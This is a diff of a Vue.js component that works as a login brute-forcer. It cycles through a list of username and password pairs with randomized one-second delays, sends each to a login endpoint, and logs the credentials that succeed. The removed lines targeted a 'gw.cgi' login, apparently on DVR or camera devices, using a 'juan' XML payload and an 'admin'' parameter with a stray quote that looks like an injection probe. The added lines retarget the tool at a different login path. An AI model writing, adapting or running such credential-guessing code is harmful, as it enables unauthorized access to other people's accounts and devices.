@@ -20,7 +20,7 @@
     },
     methods: {
       start: function () {
-        let _arr = key.wd
+        let _arr = key.sq
         for (let i = 0; i < _arr.length; i++) {
           // 生成随机数 大约一秒 请求一次
           let _t = Math.ceil(Math.random() * 200) + 900
@@ -33,30 +33,19 @@
         let _this = this
         _this.$request({
           baseURL: '',
-          url: '/post/cgi-bin/gw.cgi',
+          // url: '/post/cgi-bin/gw.cgi',
+          url: '/post/index/Login/index',
           type: 'GET',
           params: {
-            'PORTAL_LANG': 'cn',
-            'cmd': 'Login',
-            '_CACHE_LOGIN_TIME_': new Date().getTime(),
-
-            admin: `admin'`,
-            userid: `${usr}`,
+            admin: `${usr}`,
             userName: `${usr}`,
             password: `${pwd}`,
-            pwd: `${pwd}`,
-            USER_PASSWORD: `${pwd}`,
-            xml: `<juan ver="" squ="" dir=""><envload type="0" usr="${usr}" pwd="${pwd}"/></juan>`,
+            password2: `${pwd}`,
             _: new Date().getTime()
           }
         }).then(res => {
-          let str = `<juan ver="" squ="" dir="1" errno="0"><envload errno="4" usr="${usr}" pwd="${pwd}"></envload></juan>`
-          if (typeof res === 'string') {
-            res = res.replace(/[\r\n\t]/g, '')
-          }
-          console.log(res)
-          if (res !== str) {
-            // console.log(`usr="${usr}" pwd="${pwd}"`)
+          if (res.code === '1') {
+            console.log(res, `userName: ${usr},password: ${pwd}`)
           }
         })
       }
